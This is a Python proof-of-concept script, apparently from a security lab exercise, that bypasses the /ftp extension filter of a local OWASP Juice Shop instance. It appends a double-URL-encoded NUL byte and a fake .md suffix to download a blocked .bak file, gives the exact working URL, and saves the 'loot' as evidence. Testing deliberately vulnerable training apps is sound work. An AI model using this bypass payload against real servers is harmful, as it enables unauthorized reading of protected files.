#!/usr/bin/env python3
"""
c02-ftp-bypass PoC -- OWASP Juice Shop (local lab) directory-traversal/extension-filter bypass

Finding: /ftp/ serves a static listing but blocks dangerous extensions (.bak, .pyc, ...).
         The allow/deny check runs on the *decoded* path, while Express/`serve-static`
         resolves the file from the *raw* path. Double-URL-encoding a NULL byte
         (%25 00 -> "%00" after one decode pass) makes the guard see a harmless
         ".md" extension ("package.json.bak%00.md") while the filesystem call sees
         "package.json.bak" (C-string truncation at the NUL).

Working URL (exact):
    http://host.docker.internal:3000/ftp/package.json.bak%2500.md
"""
import sys
import requests

BASE = "http://host.docker.internal:3000"
TARGET = "package.json.bak"          # blocked extension
SUFFIX = "%2500.md"                  # double-encoded NUL + harmless extension
OUT = "/workspace/evidence/c2_ftp_bypass.txt"


def main() -> int:
    direct_url = f"{BASE}/ftp/{TARGET}"
    bypass_url = f"{BASE}/ftp/{TARGET}{SUFFIX}"

    # 1) prove the filter blocks the plain file
    r_blocked = requests.get(direct_url, timeout=10)
    print(f"[*] direct   {direct_url} -> HTTP {r_blocked.status_code} ({len(r_blocked.content)} bytes)")

    # 2) bypass
    r = requests.get(bypass_url, timeout=10)
    print(f"[+] bypass   {bypass_url} -> HTTP {r.status_code} ({len(r.content)} bytes)")

    if r.status_code != 200 or b'"name": "juice-shop"' not in r.content:
        print("[-] bypass failed")
        return 1

    head = r.content[:500].decode("utf-8", "replace")

    with open(OUT, "w", encoding="utf-8") as f:
        f.write("c02-ftp-bypass -- OWASP Juice Shop /ftp extension-filter bypass\n")
        f.write("=" * 70 + "\n\n")
        f.write(f"Blocked file requested : {TARGET} (.bak is on the deny list)\n")
        f.write(f"Plain request (denied) : GET {direct_url}  -> HTTP {r_blocked.status_code}\n")
        f.write(f"Bypass technique       : double-URL-encoded NUL byte (%2500) + fake .md extension\n")
        f.write(f"Exact working URL      : {bypass_url}\n")
        f.write(f"Bypass response        : HTTP {r.status_code}, {len(r.content)} bytes, "
                f"Content-Type: {r.headers.get('Content-Type')}\n\n")
        f.write("--- first 500 bytes of the downloaded .bak file ---\n")
        f.write(head + "\n")

    # keep full loot too
    with open(f"/workspace/evidence/{TARGET}.bypass", "wb") as f:
        f.write(r.content)

    print(f"[+] evidence written to {OUT}")
    print("-" * 60)
    print(head)
    return 0


if __name__ == "__main__":
    sys.exit(main())
